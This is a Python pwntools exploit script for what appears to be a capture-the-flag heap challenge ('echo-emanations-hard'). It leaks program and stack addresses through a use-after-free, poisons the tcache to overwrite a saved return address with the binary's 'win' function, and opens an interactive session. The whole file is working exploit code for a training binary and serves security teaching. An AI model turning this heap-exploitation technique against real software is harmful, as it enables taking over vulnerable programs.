#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level == "error"

elf = context.binary = ELF("/challenge/echo-emanations-hard")

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def leak_pie(io):
    io = malloc(io,0,32)
    io = free(io,0)
    io = echo(io,0,0)
    print(io.recvuntil(b"Data: ").decode())
    data = int.from_bytes(io.recvline()[:-1],"little")
    pie_base = data - next(elf.search(b"/bin/echo"))
    return io,pie_base

def leak_libc(io):
    io = malloc(io,2,32)
    io = free(io,2)
    io = echo(io,2,8)
    print(io.recvuntil(b"Data: ").decode())
    data = int.from_bytes(io.recvline()[:-1],"little")
    return io,data


def control_flow():
    ls = 0x7fff4b01c642
    rbp = 0x7fff4b01c7b0
    ret = rbp + 0x8
    offset = ret - ls
    io = process()
    io,pie_base = leak_pie(io)
    io,libc_leak = leak_libc(io)
    elf.address = pie_base
    
    io = malloc(io,0,24)
    io = malloc(io,1,24)
    io = free(io,0)
    io = free(io,1)
    io = scanf(io,1,p64(libc_leak + offset))
    io = malloc(io,2,24)
    io = malloc(io,3,24)
    io = scanf(io,3,p64(elf.sym.win))
    io = quit(io)

    io.interactive()


if __name__ == "__main__":
    control_flow()

